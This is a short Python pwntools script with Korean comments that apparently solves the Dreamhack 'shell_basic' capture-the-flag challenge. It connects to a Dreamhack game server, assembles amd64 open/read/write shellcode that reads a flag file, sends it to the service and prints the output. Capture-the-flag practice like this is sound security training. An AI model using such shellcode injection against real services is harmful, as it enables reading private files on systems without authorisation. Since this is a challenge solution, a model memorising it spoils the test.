from pwn import *

# 원격 서버에 연결
remote_host = "host1.dreamhack.games"
remote_port = 17445
p = remote(remote_host, remote_port)

# 아키텍처를 64비트로 설정 (uname -m 입력 시 x86_64인 경우)
context.arch = "amd64"

# 읽고 싶은 파일 경로
file_path = "/home/shell_basic/flag_name_is_loooooong"

# 쉘코드 생성
# 파일 열기
shellcode = shellcraft.open(file_path)

# 파일을 읽어오는 부분 (파일 디스크립터는 rax에 저장)
# 파일에서 0x30 바이트를 읽어서 rsp에 저장
shellcode += shellcraft.read('rax', 'rsp', 0x30)

# 읽은 내용을 표준 출력(stdout)에 출력
shellcode += shellcraft.write(1, 'rsp', 0x30)

# 쉘코드를 어셈블리 코드로 변환
compiled_shellcode = asm(shellcode)

# 생성된 쉘코드를 payload로 설정
payload = compiled_shellcode

# 원격 서버로 쉘코드를 전송
p.sendlineafter("shellcode: ", payload)

# 서버가 출력하는 데이터를 읽어서 출력 (최대 48바이트)
flag_data = p.recv(0x30)
print(flag_data)